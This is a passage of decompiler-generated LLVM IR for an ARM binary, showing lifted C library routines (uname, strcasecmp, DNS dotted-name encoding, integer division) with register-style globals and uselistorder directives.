  uselistorder i32 -48, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 48, { 4, 23, 13, 5, 20, 21, 14, 15, 16, 17, 1, 22, 24, 6, 25, 26, 2, 7, 27, 8, 28, 9, 30, 31, 32, 29, 18, 0, 10, 19, 11, 12, 3 }
  uselistorder i32 34, { 7, 8, 9, 10, 2, 3, 0, 5, 12, 4, 13, 11, 1, 6 }
  uselistorder i32* @fp, { 57, 58, 59, 60, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 0, 83, 93, 94, 95, 96, 97, 98, 99, 100, 101, 4, 5, 79, 80, 81, 82, 102, 103, 104, 1, 105, 106, 107, 108, 109, 84, 85, 86, 87, 88, 89, 90, 91, 92, 61, 62, 63, 64, 65, 66, 67, 68, 2, 137, 139, 138, 140, 123, 124, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 141, 142, 143, 144, 145, 146, 153, 152, 147, 148, 149, 150, 151, 3 }
  uselistorder i32* @sl, { 17, 18, 19, 20, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 42, 43, 5, 44, 45, 46, 0, 47, 1, 48, 49, 50, 51, 52, 53, 54, 55, 56, 9, 10, 36, 37, 38, 39, 40, 41, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 21, 22, 23, 24, 25, 6, 7, 11, 12, 85, 86, 87, 2, 88, 89, 90, 91, 92, 93, 95, 3, 94, 97, 96, 98, 99, 100, 101, 81, 82, 83, 84, 67, 68, 69, 70, 71, 72, 73, 4, 74, 75, 76, 77, 78, 79, 80, 13, 14, 15, 16, 8 }
  uselistorder i32* @sb, { 8, 9, 10, 11, 16, 17, 18, 19, 20, 21, 34, 22, 23, 24, 2, 25, 62, 63, 3, 64, 65, 66, 67, 68, 69, 70, 5, 6, 7, 26, 27, 28, 29, 30, 31, 32, 33, 71, 72, 73, 74, 75, 76, 77, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 1, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 12, 13, 14, 15, 88, 91, 89, 90, 92, 86, 87, 78, 79, 80, 81, 82, 83, 84, 0, 85, 4 }
  uselistorder i32* @r8, { 26, 27, 28, 29, 30, 31, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 49, 55, 58, 6, 59, 60, 61, 62, 63, 2, 64, 65, 66, 67, 68, 69, 14, 15, 16, 50, 51, 3, 52, 53, 54, 70, 71, 72, 73, 74, 75, 76, 77, 78, 56, 57, 47, 48, 32, 33, 34, 35, 17, 18, 19, 8, 9, 4, 10, 93, 94, 95, 96, 97, 5, 98, 99, 100, 101, 102, 103, 104, 105, 7, 91, 92, 79, 80, 81, 82, 83, 84, 1, 85, 0, 86, 87, 88, 11, 12, 89, 90, 20, 21, 22, 23, 24, 25, 13 }
  uselistorder label %dec_label_pc_1eaac, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_1ea80, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_1ea7c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1ea70, { 1, 0 }
  uselistorder label %dec_label_pc_1e9bc, { 1, 0 }
}

define i32 @uname(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1eac8 = load i32, i32* @r7, align 4
  store i32 %v3_1eac8, i32* %stack_var_-8, align 4
  %v0_1ead4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1ead4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1ead4, -4095
  br i1 %tmp, label %dec_label_pc_1eaf4, label %dec_label_pc_1eae4

dec_label_pc_1eae4:                               ; preds = %entry
  %v0_1eae4 = call i32 @__GI___errno_location()
  %v0_1eae8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1eae8 = sub i32 0, %v0_1eae8
  %v2_1eaec = inttoptr i32 %v0_1eae4 to i32*
  store i32 %v1_1eae8, i32* %v2_1eaec, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1eaf4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1eaf4

dec_label_pc_1eaf4:                               ; preds = %entry, %dec_label_pc_1eae4
  %v1_1eaf8 = phi i32 [ %v0_1ead4, %entry ], [ -1, %dec_label_pc_1eae4 ]
  %v2_1eaf4 = phi i32 [ %v3_1eac8, %entry ], [ %v2_1eaf4.pre, %dec_label_pc_1eae4 ]
  store i32 %v2_1eaf4, i32* @r7, align 4
  ret i32 %v1_1eaf8

; uselistorder directives
  uselistorder i32 %v0_1ead4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 ()* @__GI___errno_location, { 52, 51, 49, 48, 47, 46, 45, 86, 85, 84, 34, 40, 33, 32, 83, 82, 42, 79, 41, 50, 31, 30, 38, 37, 1, 81, 80, 78, 77, 76, 75, 7, 59, 19, 11, 74, 10, 24, 9, 18, 17, 16, 44, 43, 73, 72, 71, 15, 14, 58, 23, 35, 60, 57, 13, 27, 54, 64, 36, 0, 29, 28, 70, 8, 4, 6, 39, 68, 12, 69, 2, 56, 5, 25, 67, 26, 65, 55, 66, 21, 3, 20, 63, 62, 61, 87, 53, 22 }
  uselistorder i32* @r7, { 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 122, 123, 124, 125, 126, 127, 128, 129, 136, 137, 138, 139, 140, 151, 152, 153, 154, 155, 156, 157, 158, 163, 164, 165, 166, 167, 22, 23, 24, 25, 1, 26, 3, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 5, 179, 180, 181, 27, 28, 29, 30, 31, 32, 33, 34, 130, 131, 132, 133, 134, 135, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 6, 141, 147, 142, 7, 143, 144, 145, 14, 146, 148, 8, 149, 150, 194, 2, 195, 198, 199, 200, 9, 196, 197, 119, 120, 121, 91, 10, 92, 93, 94, 95, 96, 97, 35, 36, 41, 42, 43, 44, 37, 38, 39, 40, 45, 46, 47, 48, 266, 267, 69, 70, 236, 237, 227, 228, 49, 229, 225, 226, 268, 269, 270, 271, 276, 277, 11, 17, 18, 50, 51, 4, 52, 15, 53, 54, 238, 239, 244, 245, 246, 247, 248, 249, 250, 240, 241, 242, 243, 251, 252, 253, 254, 255, 256, 257, 258, 12, 259, 260, 261, 161, 162, 262, 263, 221, 222, 61, 62, 159, 160, 16, 218, 13, 219, 220, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 215, 216, 19, 20, 211, 212, 213, 214, 217, 0, 71, 72, 73, 74, 230, 231, 274, 275, 55, 56, 264, 265, 75, 76, 272, 273, 223, 224, 57, 58, 59, 60, 77, 78, 232, 233, 234, 235, 63, 64, 65, 66, 67, 68, 21 }
  uselistorder label %dec_label_pc_1eaf4, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @ip, align 4
  br label %dec_label_pc_1eb18

dec_label_pc_1eb18:                               ; preds = %dec_label_pc_1eb44, %entry
  %v1_1eb5c8 = phi i32 [ %v1_1eb5c9, %dec_label_pc_1eb44 ], [ 0, %entry ]
  %v0_1eb4c = phi i32 [ %v1_1eb4c, %dec_label_pc_1eb44 ], [ %arg2, %entry ]
  %v0_1eb50 = phi i32 [ %v1_1eb50, %dec_label_pc_1eb44 ], [ %tmp, %entry ]
  %v9_1eb18 = icmp eq i32 %v0_1eb50, %v0_1eb4c
  %.pre = inttoptr i32 %v0_1eb50 to i8*
  br i1 %v9_1eb18, label %dec_label_pc_1eb44, label %dec_label_pc_1eb20

dec_label_pc_1eb20:                               ; preds = %dec_label_pc_1eb18
  %v2_1eb20 = load i8, i8* %.pre, align 1
  %v3_1eb20 = zext i8 %v2_1eb20 to i32
  %v1_1eb24 = inttoptr i32 %v0_1eb4c to i8*
  %v2_1eb24 = load i8, i8* %v1_1eb24, align 1
  %v3_1eb24 = zext i8 %v2_1eb24 to i32
  %v4_1eb28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 1172) to i32*), align 4
  %v2_1eb2c = mul nuw nsw i32 %v3_1eb24, 2
  %v2_1eb30 = mul nuw nsw i32 %v3_1eb20, 2
  %v2_1eb34 = add i32 %v4_1eb28, %v2_1eb2c
  %v3_1eb34 = inttoptr i32 %v2_1eb34 to i16*
  %v4_1eb34 = load i16, i16* %v3_1eb34, align 2
  %v6_1eb34 = sext i16 %v4_1eb34 to i32
  %v2_1eb38 = add i32 %v4_1eb28, %v2_1eb30
  %v3_1eb38 = inttoptr i32 %v2_1eb38 to i16*
  %v4_1eb38 = load i16, i16* %v3_1eb38, align 2
  %v6_1eb38 = sext i16 %v4_1eb38 to i32
  %v2_1eb3c = sub nsw i32 %v6_1eb38, %v6_1eb34
  %v9_1eb3c = icmp eq i16 %v4_1eb38, %v4_1eb34
  br i1 %v9_1eb3c, label %dec_label_pc_1eb44, label %dec_label_pc_1eb58

dec_label_pc_1eb44:                               ; preds = %dec_label_pc_1eb18, %dec_label_pc_1eb20
  %v1_1eb5c9 = phi i32 [ %v2_1eb3c, %dec_label_pc_1eb20 ], [ %v1_1eb5c8, %dec_label_pc_1eb18 ]
  %v2_1eb44 = load i8, i8* %.pre, align 1
  %v2_1eb48 = icmp eq i8 %v2_1eb44, 0
  %v1_1eb4c = add i32 %v0_1eb4c, 1
  %v1_1eb50 = add i32 %v0_1eb50, 1
  store i32 %v1_1eb50, i32* @ip, align 4
  br i1 %v2_1eb48, label %dec_label_pc_1eb58, label %dec_label_pc_1eb18

dec_label_pc_1eb58:                               ; preds = %dec_label_pc_1eb44, %dec_label_pc_1eb20
  %v1_1eb5c = phi i32 [ %v1_1eb5c9, %dec_label_pc_1eb44 ], [ %v2_1eb3c, %dec_label_pc_1eb20 ]
  ret i32 %v1_1eb5c

; uselistorder directives
  uselistorder i32 %v1_1eb50, { 1, 0 }
  uselistorder i32 %v2_1eb3c, { 1, 0 }
  uselistorder i32 %v0_1eb50, { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_2e024.1314 to i32), { 103, 75, 76, 77, 104, 3, 4, 78, 105, 1, 106, 107, 108, 109, 110, 111, 112, 79, 80, 113, 43, 42, 44, 114, 115, 30, 81, 116, 117, 118, 119, 9, 11, 6, 7, 10, 5, 8, 120, 121, 122, 45, 12, 83, 123, 124, 125, 13, 84, 126, 127, 33, 31, 32, 14, 15, 128, 16, 85, 129, 17, 130, 18, 131, 86, 132, 87, 133, 19, 20, 134, 89, 135, 136, 137, 138, 139, 140, 34, 69, 65, 63, 62, 64, 66, 67, 68, 61, 70, 56, 58, 57, 55, 54, 59, 60, 51, 50, 53, 52, 49, 48, 47, 46, 91, 71, 90, 72, 73, 88, 92, 141, 2, 94, 93, 95, 22, 21, 142, 23, 24, 25, 26, 143, 96, 27, 144, 98, 97, 41, 38, 39, 40, 37, 28, 74, 36, 35, 145, 82, 99, 146, 100, 147, 29, 148, 101, 149, 0, 102 }
  uselistorder label %dec_label_pc_1eb44, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v3_1eb68 = load i32, i32* @r4, align 4
  store i32 %v3_1eb68, i32* %stack_var_-32, align 4
  %v6_1eb68 = load i32, i32* @r5, align 4
  %v9_1eb68 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1eb70 = load i32, i32* @r1, align 4
  store i32 %v0_1eb70, i32* %r8.global-to-local, align 4
  %v0_1eb74 = load i32, i32* @r2, align 4
  store i32 %v0_1eb74, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1ebdc23 = icmp slt i8* %arg1, null
  store i1 %v1_1ebdc23, i1* %cpsr_n.global-to-local, align 1
  %v2_1ebdc24 = icmp eq i8* %arg1, null
  store i1 %v2_1ebdc24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ebdc24, label %dec_label_pc_1ebf4, label %dec_label_pc_1ebe8

dec_label_pc_1eb80:                               ; preds = %dec_label_pc_1ebe8
  %v2_1eb80 = call i32 @__GI_strchr(i32 %v0_1eb8026, i32 46)
  store i32 %v2_1eb80, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1eb84 = icmp slt i32 %v2_1eb80, 0
  store i1 %v1_1eb84, i1* %cpsr_n.global-to-local, align 1
  %v2_1eb84 = icmp eq i32 %v2_1eb80, 0
  store i1 %v2_1eb84, i1* %cpsr_z.global-to-local, align 1
  %v0_1eb88 = load i32, i32* @r4, align 4
  %v2_1eb88 = sub i32 %v2_1eb80, %v0_1eb88
  store i32 %v2_1eb88, i32* @r5, align 4
  br i1 %v2_1eb84, label %dec_label_pc_1eb90, label %dec_label_pc_1eb9c

dec_label_pc_1eb90:                               ; preds = %dec_label_pc_1eb80
  %v1_1eb90 = inttoptr i32 %v0_1eb88 to i8*
  %v3_1eb94 = call i32 @strlen(i8* %v1_1eb90)
  %sext = mul i32 %v3_1eb94, 16777216
  %v1_1eb98 = sdiv i32 %sext, 16777216
  store i32 %v1_1eb98, i32* @r5, align 4
  %v0_1eba8.pre = load i32, i32* @r4, align 4
  %v0_1ebb8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1eb9c

dec_label_pc_1eb9c:                               ; preds = %dec_label_pc_1eb80, %dec_label_pc_1eb90
  %v0_1ebb8 = phi i32 [ %v2_1eb80, %dec_label_pc_1eb80 ], [ %v0_1ebb8.pre, %dec_label_pc_1eb90 ]
  %v0_1eba8 = phi i32 [ %v0_1eb88, %dec_label_pc_1eb80 ], [ %v0_1eba8.pre, %dec_label_pc_1eb90 ]
  %v0_1ebc8 = phi i32 [ %v2_1eb88, %dec_label_pc_1eb80 ], [ %v1_1eb98, %dec_label_pc_1eb90 ]
  %v0_1eb9c = load i32, i32* %sl.global-to-local, align 4
  %v1_1eb9c = add i32 %v0_1eb9c, 1
  store i32 %v1_1eb9c, i32* %r7.global-to-local, align 4
  %v1_1eba0 = load i32, i32* %sb.global-to-local, align 4
  %v2_1eba0 = sub i32 %v1_1eba0, %v0_1eb9c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1eba4 = icmp slt i32 %v0_1ebc8, 0
  store i1 %v1_1eba4, i1* %cpsr_n.global-to-local, align 1
  %v2_1eba4 = icmp eq i32 %v0_1ebc8, 0
  store i1 %v2_1eba4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1eba8, i32* @r1, align 4
  %v0_1ebac = load i32, i32* %r8.global-to-local, align 4
  %v2_1ebac = add i32 %v0_1ebac, %v1_1eb9c
  store i32 %v2_1ebac, i32* @r0, align 4
  store i32 %v0_1ebc8, i32* @r2, align 4
  %v1_1ebb4 = add i32 %v2_1eba0, -1
  store i32 %v1_1ebb4, i32* @r3, align 4
  %v1_1ebb8 = add i32 %v0_1ebb8, 1
  store i32 %v1_1ebb8, i32* @r4, align 4
  br i1 %v2_1eba4, label %dec_label_pc_1ec08, label %dec_label_pc_1ebc0

dec_label_pc_1ebc0:                               ; preds = %dec_label_pc_1eb9c
  %v2_1ebc0 = sub i32 %v0_1ebc8, %v1_1ebb4
  %v3_1ebc0 = icmp ult i32 %v0_1ebc8, %v1_1ebb4
  %v4_1ebc0 = xor i32 %v1_1ebb4, %v0_1ebc8
  %v5_1ebc0 = xor i32 %v2_1ebc0, %v0_1ebc8
  %v6_1ebc0 = and i32 %v5_1ebc0, %v4_1ebc0
  %v7_1ebc0 = icmp slt i32 %v6_1ebc0, 0
  store i1 %v7_1ebc0, i1* %cpsr_v.global-to-local, align 1
  %v8_1ebc0 = icmp slt i32 %v2_1ebc0, 0
  store i1 %v8_1ebc0, i1* %cpsr_n.global-to-local, align 1
  %v9_1ebc0 = icmp eq i32 %v0_1ebc8, %v1_1ebb4
  store i1 %v9_1ebc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1ebc0, label %dec_label_pc_1ebc8, label %dec_label_pc_1ec08

dec_label_pc_1ebc8:                               ; preds = %dec_label_pc_1ebc0
  %v1_1ebc8 = trunc i32 %v0_1ebc8 to i8
  %v4_1ebc8 = add i32 %v0_1ebac, %v0_1eb9c
  %v5_1ebc8 = inttoptr i32 %v4_1ebc8 to i8*
  store i8 %v1_1ebc8, i8* %v5_1ebc8, align 1
  %v0_1ebcc = call i32 @memcpy()
  store i32 %v0_1ebcc, i32* @r0, align 4
  %v0_1ebd0 = load i32, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1ebd0 = icmp slt i32 %v0_1ebd0, 0
  store i1 %v1_1ebd0, i1* %cpsr_n.global-to-local, align 1
  %v2_1ebd0 = icmp eq i32 %v0_1ebd0, 0
  store i1 %v2_1ebd0, i1* %cpsr_z.global-to-local, align 1
  %v0_1ebd4 = load i32, i32* @r5, align 4
  %v1_1ebd4 = load i32, i32* %r7.global-to-local, align 4
  %v2_1ebd4 = add i32 %v1_1ebd4, %v0_1ebd4
  store i32 %v2_1ebd4, i32* %sl.global-to-local, align 4
  br i1 %v2_1ebd0, label %dec_label_pc_1ebf4, label %dec_label_pc_1ebc8.dec_label_pc_1ebdc_crit_edge

dec_label_pc_1ebc8.dec_label_pc_1ebdc_crit_edge:  ; preds = %dec_label_pc_1ebc8
  %v0_1ebdc.pre = load i32, i32* @r4, align 4
  store i32 %v0_1ebdc.pre, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1ebdc = icmp slt i32 %v0_1ebdc.pre, 0
  store i1 %v1_1ebdc, i1* %cpsr_n.global-to-local, align 1
  %v2_1ebdc = icmp eq i32 %v0_1ebdc.pre, 0
  store i1 %v2_1ebdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ebdc, label %dec_label_pc_1ebf4, label %dec_label_pc_1ebe8

dec_label_pc_1ebe8:                               ; preds = %entry, %dec_label_pc_1ebc8.dec_label_pc_1ebdc_crit_edge
  %v0_1eb8026 = phi i32 [ %v0_1ebdc.pre, %dec_label_pc_1ebc8.dec_label_pc_1ebdc_crit_edge ], [ %tmp, %entry ]
  %v5_1ebfc525 = phi i32 [ %v2_1ebd4, %dec_label_pc_1ebc8.dec_label_pc_1ebdc_crit_edge ], [ 0, %entry ]
  %v1_1ebe8 = inttoptr i32 %v0_1eb8026 to i8*
  %v2_1ebe8 = load i8, i8* %v1_1ebe8, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1ebec = icmp eq i8 %v2_1ebe8, 0
  store i1 %v2_1ebec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ebec, label %dec_label_pc_1ebf4, label %dec_label_pc_1eb80

dec_label_pc_1ebf4:                               ; preds = %dec_label_pc_1ebc8.dec_label_pc_1ebdc_crit_edge, %dec_label_pc_1ebc8, %dec_label_pc_1ebe8, %entry
  %v8_1ec00 = phi i32 [ 0, %entry ], [ %v5_1ebfc525, %dec_label_pc_1ebe8 ], [ %v2_1ebd4, %dec_label_pc_1ebc8 ], [ %v2_1ebd4, %dec_label_pc_1ebc8.dec_label_pc_1ebdc_crit_edge ]
  %v0_1ebf4 = load i32, i32* %sb.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1ebf4 = icmp slt i32 %v0_1ebf4, 0
  store i1 %v1_1ebf4, i1* %cpsr_n.global-to-local, align 1
  %v2_1ebf4 = icmp eq i32 %v0_1ebf4, 0
  store i1 %v2_1ebf4, i1* %cpsr_z.global-to-local, align 1
  %tmp21 = icmp slt i32 %v0_1ebf4, 1
  br i1 %tmp21, label %bb22, label %bb

bb:                                               ; preds = %dec_label_pc_1ebf4
  %v6_1ebfc = add i32 %v8_1ec00, 1
  store i32 %v6_1ebfc, i32* @r0, align 4
  %v7_1ec00 = load i32, i32* %r8.global-to-local, align 4
  %v9_1ec00 = add i32 %v7_1ec00, %v8_1ec00
  %v10_1ec00 = inttoptr i32 %v9_1ec00 to i8*
  store i8 0, i8* %v10_1ec00, align 1
  %v0_1ec04.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1ec04.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1ec04.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_1ebf4, %bb
  %v2_1ec04 = phi i1 [ %v2_1ec04.pre, %bb ], [ false, %dec_label_pc_1ebf4 ]
  %v1_1ec04 = phi i1 [ %v1_1ec04.pre, %bb ], [ %v1_1ebf4, %dec_label_pc_1ebf4 ]
  %v0_1ec04 = phi i1 [ %v0_1ec04.pre, %bb ], [ %v2_1ebf4, %dec_label_pc_1ebf4 ]
  %v3_1ec04 = xor i1 %v2_1ec04, %v1_1ec04
  %v4_1ec04 = or i1 %v0_1ec04, %v3_1ec04
  br i1 %v4_1ec04, label %dec_label_pc_1ec08, label %.dec_label_pc_1ec0c_crit_edge

.dec_label_pc_1ec0c_crit_edge:                    ; preds = %bb22
  %v1_1ec10.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1ec0c

dec_label_pc_1ec08:                               ; preds = %dec_label_pc_1ebc0, %dec_label_pc_1eb9c, %bb22
  br label %dec_label_pc_1ec0c

dec_label_pc_1ec0c:                               ; preds = %.dec_label_pc_1ec0c_crit_edge, %dec_label_pc_1ec08
  %v1_1ec10 = phi i32 [ %v1_1ec10.pre, %.dec_label_pc_1ec0c_crit_edge ], [ -1, %dec_label_pc_1ec08 ]
  %v2_1ec0c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1ec0c, i32* @r4, align 4
  store i32 %v6_1eb68, i32* @r5, align 4
  store i32 %v9_1eb68, i32* @r6, align 4
  ret i32 %v1_1ec10

; uselistorder directives
  uselistorder i32 %v0_1ebf4, { 0, 2, 1 }
  uselistorder i32 %v0_1ebdc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1ebd0, { 1, 0 }
  uselistorder i32 %v2_1ebc0, { 1, 0 }
  uselistorder i32 %v1_1ebb4, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_1ebc8, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_1eb98, { 1, 0 }
  uselistorder i1 %v2_1ebdc24, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i8 0, { 8, 47, 48, 1, 2, 50, 49, 51, 3, 52, 30, 53, 10, 11, 54, 4, 55, 56, 58, 57, 33, 59, 34, 12, 61, 60, 13, 14, 15, 16, 17, 63, 62, 35, 64, 5, 65, 66, 9, 67, 31, 32, 69, 70, 68, 71, 73, 72, 36, 74, 18, 75, 76, 77, 19, 78, 6, 79, 45, 20, 21, 22, 23, 24, 25, 80, 81, 82, 83, 84, 37, 86, 87, 88, 89, 85, 26, 27, 0, 90, 91, 92, 28, 94, 93, 29, 95, 96, 97, 38, 98, 99, 7, 101, 102, 39, 103, 104, 100, 105, 106, 107, 108, 110, 109, 111, 114, 112, 113, 115, 118, 116, 117, 119, 135, 136, 132, 133, 134, 130, 131, 128, 129, 126, 127, 124, 125, 121, 122, 123, 120, 137, 138, 139, 140, 141, 142, 144, 143, 146, 145, 147, 40, 149, 148, 46, 150, 41, 151, 153, 154, 152, 42, 155, 156, 44, 157, 43, 158, 159, 160, 161, 162, 163 }
  uselistorder i32 ()* @memcpy, { 20, 19, 18, 13, 12, 11, 10, 9, 8, 26, 17, 16, 7, 15, 3, 2, 4, 1, 0, 5, 14, 6, 25, 24, 23, 22, 21 }
  uselistorder i32 (i8*)* @strlen, { 16, 14, 13, 12, 11, 10, 28, 27, 15, 0, 8, 7, 29, 26, 25, 24, 22, 23, 21, 20, 9, 19, 32, 31, 30, 18, 17, 6, 4, 5, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 11, 7, 6, 5, 2, 1, 0, 10, 9, 8, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 4, 3 }
  uselistorder i32 46, { 0, 1, 5, 6, 7, 8, 9, 4, 2, 3 }
  uselistorder label %dec_label_pc_1ec0c, { 1, 0 }
  uselistorder label %dec_label_pc_1ec08, { 2, 0, 1 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_1ebf4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1ebe8, { 1, 0 }
  uselistorder label %dec_label_pc_1eb9c, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_1ec14 = load i32, i32* @r1, align 4
  %v1_1ec14 = icmp slt i32 %v0_1ec14, 0
  %v2_1ec14 = icmp eq i32 %v0_1ec14, 0
  %v2_1ec18 = xor i32 %v0_1ec14, %arg1
  br i1 %v2_1ec14, label %dec_label_pc_1ed2c, label %dec_label_pc_1ec20

dec_label_pc_1ec20:                               ; preds = %entry
  br i1 %v1_1ec14, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1ec20
  %v2_1ec20 = sub i32 0, %v0_1ec14
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1ec20, %bb
  %v1_1ecec = phi i32 [ %v2_1ec20, %bb ], [ %v0_1ec14, %dec_label_pc_1ec20 ]
  %v1_1ec24 = add i32 %v1_1ecec, -1
  %v7_1ec24 = icmp eq i32 %v1_1ecec, 1
  br i1 %v7_1ec24, label %dec_label_pc_1eccc, label %dec_label_pc_1ec2c

dec_label_pc_1ec2c:                               ; preds = %thread-pre-split
  %v1_1ec2c = icmp slt i32 %arg1, 0
  br i1 %v1_1ec2c, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_1ec2c
  %v2_1ec30 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_1ec2c, %bb85
  %v0_1ed20 = phi i32 [ %arg1, %dec_label_pc_1ec2c ], [ %v2_1ec30, %bb85 ]
  %v3_1ec34 = icmp uge i32 %v0_1ed20, %v1_1ecec
  %v9_1ec34 = icmp eq i32 %v0_1ed20, %v1_1ecec
  %v2_1ec38 = xor i1 %v3_1ec34, true
  %v3_1ec38 = or i1 %v9_1ec34, %v2_1ec38
  br i1 %v3_1ec38, label %dec_label_pc_1ecd8, label %dec_label_pc_1ec3c

dec_label_pc_1ec3c:                               ; preds = %bb86
  %v2_1ec3c = and i32 %v1_1ec24, %v1_1ecec
  %v4_1ec3c = icmp eq i32 %v2_1ec3c, 0
  br i1 %v4_1ec3c, label %dec_label_pc_1ece8, label %dec_label_pc_1ec44

dec_label_pc_1ec44:                               ; preds = %dec_label_pc_1ec3c
  %v3_1ec44 = icmp ult i32 %v1_1ecec, 536870912
  br i1 %v3_1ec44, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1ec44
  %v4_1ec48 = mul i32 %v1_1ecec, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1ec44, %.thread
  %v0_1ec68.pr40.ph = phi i32 [ %v4_1ec48, %.thread ], [ %v1_1ecec, %dec_label_pc_1ec44 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1ec44 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1ec68.pr40 = phi i32 [ %v4_1ec5c, %bb89 ], [ %v0_1ec68.pr40.ph, %.preheader.preheader ]
  %v1_1ec60 = phi i32 [ %v4_1ec60, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_1ec54 = icmp ugt i32 %v0_1ec68.pr40, 268435455
  br i1 %v2_1ec54, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1ec68thread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_1ec58 = icmp ult i32 %v0_1ec68.pr40, %v0_1ed20
  br i1 %v4_1ec58, label %bb88, label %dec_label_pc_1ec68thread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
